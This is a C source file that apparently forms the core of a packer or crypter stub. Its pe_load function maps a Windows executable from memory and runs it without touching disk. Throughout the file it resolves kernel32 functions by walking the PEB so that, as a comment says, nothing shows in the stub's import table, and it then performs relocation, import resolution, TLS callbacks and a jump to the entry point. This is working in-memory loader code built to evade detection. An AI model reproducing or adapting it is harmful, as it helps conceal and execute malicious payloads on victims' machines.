#include <windows.h>
#include <stdint.h>
#include "peb_utils.h"
#include "pe_load.h"

typedef LPVOID(WINAPI *pfnVA)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *pfnVP)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE(WINAPI *pfnLL)(LPCSTR);
typedef FARPROC(WINAPI *pfnGP)(HMODULE, LPCSTR);

static void _cpy(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--)
        *d++ = *s++;
}

static DWORD _sec_prot(DWORD chr)
{
    if (chr & IMAGE_SCN_MEM_EXECUTE)
        return (chr & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
    return (chr & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
}

void pe_load(const uint8_t *data, size_t size)
{
    (void)size;

    /* resolve APIs from kernel32 via PEB — nothing in stub import table */
    HMODULE k32 = _peb_mod(L"kernel32.dll");
    pfnVA fnVA = (pfnVA)_peb_proc(k32, "VirtualAlloc");
    pfnVP fnVP = (pfnVP)_peb_proc(k32, "VirtualProtect");
    pfnLL fnLL = (pfnLL)_peb_proc(k32, "LoadLibraryA");
    pfnGP fnGP = (pfnGP)_peb_proc(k32, "GetProcAddress");
    if (!fnVA || !fnVP || !fnLL || !fnGP)
        return;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)data;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(data + dos->e_lfanew);
    DWORD img_sz = nt->OptionalHeader.SizeOfImage;
    DWORD hdr_sz = nt->OptionalHeader.SizeOfHeaders;
    ULONGLONG pref = nt->OptionalHeader.ImageBase;

    /* allocate: preferred base first, then anywhere */
    uint8_t *base = (uint8_t *)fnVA((LPVOID)pref, img_sz,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base)
        base = (uint8_t *)fnVA(NULL, img_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base)
        return;

    /* copy headers */
    _cpy(base, data, hdr_sz);

    /* copy sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (sec[i].SizeOfRawData)
            _cpy(base + sec[i].VirtualAddress,
                 data + sec[i].PointerToRawData,
                 sec[i].SizeOfRawData);
    }

    /* base relocations */
    ULONGLONG delta = (ULONGLONG)base - pref;
    IMAGE_DATA_DIRECTORY *rdir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (delta && rdir->VirtualAddress)
    {
        IMAGE_BASE_RELOCATION *blk =
            (IMAGE_BASE_RELOCATION *)(base + rdir->VirtualAddress);
        while (blk->VirtualAddress && blk->SizeOfBlock >= sizeof(*blk))
        {
            int cnt = (int)((blk->SizeOfBlock - sizeof(*blk)) / sizeof(WORD));
            WORD *ent = (WORD *)((uint8_t *)blk + sizeof(*blk));
            for (int i = 0; i < cnt; i++)
            {
                if ((ent[i] >> 12) == IMAGE_REL_BASED_DIR64)
                {
                    ULONGLONG *ptr =
                        (ULONGLONG *)(base + blk->VirtualAddress + (ent[i] & 0xFFF));
                    *ptr += delta;
                }
            }
            blk = (IMAGE_BASE_RELOCATION *)((uint8_t *)blk + blk->SizeOfBlock);
        }
    }

    /* import table */
    IMAGE_DATA_DIRECTORY *idir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (idir->VirtualAddress)
    {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(base + idir->VirtualAddress);
        for (; imp->Name; imp++)
        {
            HMODULE dll = fnLL((const char *)(base + imp->Name));
            if (!dll)
                continue;
            IMAGE_THUNK_DATA *thk = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);
            IMAGE_THUNK_DATA *orig = imp->OriginalFirstThunk
                                         ? (IMAGE_THUNK_DATA *)(base + imp->OriginalFirstThunk)
                                         : thk;
            for (; orig->u1.AddressOfData; thk++, orig++)
            {
                if (IMAGE_SNAP_BY_ORDINAL64(orig->u1.Ordinal))
                    thk->u1.Function =
                        (ULONGLONG)fnGP(dll, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
                else
                {
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME *)(base + orig->u1.AddressOfData);
                    thk->u1.Function = (ULONGLONG)fnGP(dll, ibn->Name);
                }
            }
        }
    }

    /* set section permissions */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        DWORD vsz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize
                                            : sec[i].SizeOfRawData;
        if (!vsz)
            continue;
        DWORD old;
        fnVP(base + sec[i].VirtualAddress, vsz, _sec_prot(sec[i].Characteristics), &old);
    }

    /* TLS callbacks */
    IMAGE_DATA_DIRECTORY *tdir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tdir->VirtualAddress)
    {
        IMAGE_TLS_DIRECTORY64 *tls =
            (IMAGE_TLS_DIRECTORY64 *)(base + tdir->VirtualAddress);
        PIMAGE_TLS_CALLBACK *cb = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
        if (cb)
            for (; *cb; cb++)
                (*cb)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
    }

    /* call OEP */
    typedef void (*oep_t)(void);
    ((oep_t)(base + nt->OptionalHeader.AddressOfEntryPoint))();
}
